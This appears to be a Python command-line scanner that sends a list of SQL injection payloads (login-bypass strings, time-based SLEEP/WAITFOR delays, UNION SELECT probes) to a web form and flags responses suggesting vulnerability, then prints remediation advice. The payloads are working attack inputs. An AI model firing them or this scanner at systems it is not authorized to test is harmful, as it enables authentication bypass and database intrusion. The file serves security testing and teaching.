#!/usr/bin/env python3
"""
SQL Injection Checker
Tests for SQL injection vulnerabilities using boolean-based techniques
"""

import sys
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from urllib.parse import urlparse, urljoin

console = Console()

# SQL injection payloads for testing
SQLI_PAYLOADS = [
    # Boolean-based payloads
    ("' OR '1'='1", "Classic OR bypass"),
    ("' OR 1=1--", "OR with comment"),
    ("' OR 1=1#", "OR with hash comment"),
    ("admin' OR '1'='1", "Admin OR bypass"),
    ("admin'--", "Admin with comment"),
    ("' OR 'a'='a", "String comparison"),
    ("') OR ('1'='1", "Parenthesis bypass"),
    ("' OR '1'='1'--", "OR with trailing comment"),
    
    # Time-based detection
    ("' AND SLEEP(5)--", "Time-based MySQL"),
    ("'; WAITFOR DELAY '0:0:5'--", "Time-based MSSQL"),
    
    # Union-based
    ("' UNION SELECT NULL--", "Union NULL"),
    ("' UNION SELECT 1,2,3--", "Union numbers"),
    
    # Error-based
    ("'", "Single quote"),
    ("''", "Double quote"),
    ("' AND '1'='2", "False condition"),
]


def banner():
    """Display scanner banner"""
    console.print("\n[bold cyan]💉 SQL Injection Checker[/bold cyan]")
    console.print("[dim]Testing for SQL injection vulnerabilities...[/dim]\n")


def test_sqli(url, param_name='username', method='POST'):
    """
    Test for SQL injection vulnerability
    
    Args:
        url: Target URL
        param_name: Parameter name to test
        method: HTTP method (GET or POST)
        
    Returns:
        list: Detected vulnerabilities
    """
    vulnerabilities = []
    
    # Get baseline response
    baseline_data = {param_name: 'normaluser', 'password': 'normalpass'}
    
    try:
        if method.upper() == 'POST':
            baseline = requests.post(url, data=baseline_data, timeout=10)
        else:
            baseline = requests.get(url, params=baseline_data, timeout=10)
        
        baseline_length = len(baseline.content)
        baseline_status = baseline.status_code
    
    except requests.exceptions.RequestException as e:
        console.print(f"[red]✗ Error getting baseline: {str(e)}[/red]")
        return []
    
    console.print(f"[dim]Baseline response: {baseline_status} ({baseline_length} bytes)[/dim]\n")
    
    # Test each payload
    for payload, description in SQLI_PAYLOADS:
        test_data = {param_name: payload, 'password': 'test'}
        
        try:
            if method.upper() == 'POST':
                response = requests.post(url, data=test_data, timeout=10)
            else:
                response = requests.get(url, params=test_data, timeout=10)
            
            response_length = len(response.content)
            response_status = response.status_code
            
            # Check for indicators of successful injection
            vulnerable = False
            reason = ""
            
            # Status code change
            if response_status != baseline_status:
                vulnerable = True
                reason = f"Status changed: {baseline_status} → {response_status}"
            
            # Significant content length change
            elif abs(response_length - baseline_length) > 100:
                vulnerable = True
                reason = f"Content length changed: {baseline_length} → {response_length}"
            
            # Check for SQL error messages
            error_indicators = [
                'sql syntax',
                'mysql',
                'sqlite',
                'postgresql',
                'oracle',
                'syntax error',
                'database error',
                'warning: mysql',
                'unclosed quotation',
                'quoted string not properly terminated'
            ]
            
            response_text = response.text.lower()
            for indicator in error_indicators:
                if indicator in response_text:
                    vulnerable = True
                    reason = f"SQL error detected: '{indicator}'"
                    break
            
            # Check for successful login indicators
            success_indicators = ['dashboard', 'welcome', 'logout', 'successful']
            if any(ind in response_text for ind in success_indicators):
                if 'login' not in response_text.lower() or response_status in [301, 302]:
                    vulnerable = True
                    reason = "Possible authentication bypass"
            
            if vulnerable:
                vulnerabilities.append({
                    'payload': payload,
                    'description': description,
                    'reason': reason,
                    'status': response_status,
                    'length': response_length
                })
                console.print(f"[red]✗ VULNERABLE:[/red] {description}")
                console.print(f"  [dim]Payload: {payload}[/dim]")
                console.print(f"  [yellow]Reason: {reason}[/yellow]\n")
            else:
                console.print(f"[green]✓[/green] {description}: Not vulnerable")
        
        except requests.exceptions.Timeout:
            console.print(f"[yellow]⏱ {description}: Timeout (possible time-based SQLi)[/yellow]")
        except requests.exceptions.RequestException as e:
            console.print(f"[dim]⚠ {description}: Error - {str(e)}[/dim]")
    
    return vulnerabilities


def display_results(url, vulnerabilities):
    """
    Display scan results
    
    Args:
        url: Target URL
        vulnerabilities: List of detected vulnerabilities
    """
    console.print(f"\n[bold]Target:[/bold] {url}\n")
    
    if not vulnerabilities:
        console.print(Panel(
            "[green]✓ No SQL injection vulnerabilities detected[/green]",
            title="Results",
            border_style="green"
        ))
        console.print()
        return
    
    # Critical vulnerability warning
    console.print(Panel(
        f"[bold red]⚠️  CRITICAL: {len(vulnerabilities)} SQL Injection vulnerability(ies) detected![/bold red]\n\n"
        "[yellow]This application is vulnerable to SQL injection attacks.[/yellow]\n"
        "[yellow]Attackers can potentially:[/yellow]\n"
        "  • Bypass authentication\n"
        "  • Access sensitive data\n"
        "  • Modify or delete database records\n"
        "  • Execute administrative operations",
        title="🚨 Security Alert",
        border_style="red"
    ))
    
    # Vulnerability details
    console.print("\n[bold red]Detected Vulnerabilities:[/bold red]")
    table = Table(show_header=True, header_style="bold red")
    table.add_column("Payload", style="cyan", max_width=30)
    table.add_column("Type", style="yellow")
    table.add_column("Detection Reason", style="white")
    table.add_column("Status", justify="center")
    
    for vuln in vulnerabilities:
        table.add_row(
            vuln['payload'],
            vuln['description'],
            vuln['reason'],
            str(vuln['status'])
        )
    
    console.print(table)
    
    # Remediation
    console.print("\n[bold cyan]🔧 Remediation Steps:[/bold cyan]")
    console.print("""
  1. [bold]Use Parameterized Queries (Prepared Statements)[/bold]
     • Never concatenate user input into SQL queries
     • Use placeholders: cursor.execute("SELECT * FROM users WHERE username=?", (username,))
  
  2. [bold]Input Validation[/bold]
     • Validate and sanitize all user inputs
     • Use allowlists for expected input patterns
     • Reject suspicious characters
  
  3. [bold]Use ORM Frameworks[/bold]
     • SQLAlchemy, Django ORM, etc.
     • These handle parameterization automatically
  
  4. [bold]Principle of Least Privilege[/bold]
     • Database user should have minimal permissions
     • Don't use admin/root accounts for application
  
  5. [bold]Web Application Firewall (WAF)[/bold]
     • Add an additional layer of protection
     • Can detect and block common SQLi patterns
    """)
    
    # Example fix
    console.print("[bold cyan]📝 Example Fix:[/bold cyan]")
    console.print("""
[red]❌ Vulnerable Code:[/red]
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)

[green]✅ Secure Code:[/green]
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
    """)
    
    console.print()


def main():
    """Main entry point"""
    if len(sys.argv) < 2:
        console.print("[red]Usage: python sqli_check.py <target_url>[/red]")
        console.print("[dim]Example: python sqli_check.py http://localhost:5000/login[/dim]")
        console.print("\n[dim]Optional arguments:[/dim]")
        console.print("[dim]  --param <name>    Parameter name to test (default: username)[/dim]")
        console.print("[dim]  --method <GET|POST>    HTTP method (default: POST)[/dim]")
        sys.exit(1)
    
    target = sys.argv[1]
    param_name = 'username'
    method = 'POST'
    
    # Parse optional arguments
    if '--param' in sys.argv:
        idx = sys.argv.index('--param')
        if idx + 1 < len(sys.argv):
            param_name = sys.argv[idx + 1]
    
    if '--method' in sys.argv:
        idx = sys.argv.index('--method')
        if idx + 1 < len(sys.argv):
            method = sys.argv[idx + 1]
    
    # Validate URL
    parsed = urlparse(target)
    if not parsed.scheme:
        target = f"http://{target}"
    
    banner()
    console.print(f"[bold]Testing parameter:[/bold] {param_name}")
    console.print(f"[bold]HTTP method:[/bold] {method}\n")
    
    # Run tests
    vulnerabilities = test_sqli(target, param_name, method)
    
    # Display results
    display_results(target, vulnerabilities)


if __name__ == '__main__':
    main()
